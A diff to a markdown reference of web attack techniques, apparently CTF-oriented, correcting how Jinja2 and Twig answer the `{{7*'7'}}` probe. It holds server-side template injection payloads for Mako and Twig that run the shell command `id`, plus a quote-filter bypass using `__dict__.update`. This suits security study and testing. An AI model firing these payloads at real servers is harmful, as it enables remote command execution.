@@ -167,7 +167,7 @@ See [web-auth-session](../web-auth-session/SKILL.md) for full JWT/JWE attacks an
 {{obj.__dict__.update(attr=value) or obj.name}}
 ```
 
-**Mako SSTI (Python):** `${__import__('os').popen('id').read()}` — no sandbox, plain Python inside `${}` or `<% %>`. **Twig SSTI (PHP):** `{{['id']|map('system')|join}}` — distinguish from Jinja2 via `{{7*'7'}}` (Twig repeats string, Jinja2 returns 49). See [server-side.md](server-side.md#mako-ssti) and [server-side.md](server-side.md#twig-ssti).
+**Mako SSTI (Python):** `${__import__('os').popen('id').read()}` — no sandbox, plain Python inside `${}` or `<% %>`. **Twig SSTI (PHP):** `{{['id']|map('system')|join}}` — distinguish from Jinja2 via `{{7*'7'}}` (Jinja2 python-repeats the string to 7777777, Twig casts to 49). See [server-side.md](server-side.md#mako-ssti) and [server-side.md](server-side.md#twig-ssti).
 
 **Quote filter bypass:** Use `__dict__.update(key=value)` — keyword arguments need no quotes. See [server-side.md](server-side.md#ssti-quote-filter-bypass-via-__dict__update-apoorvctf-2026).
 
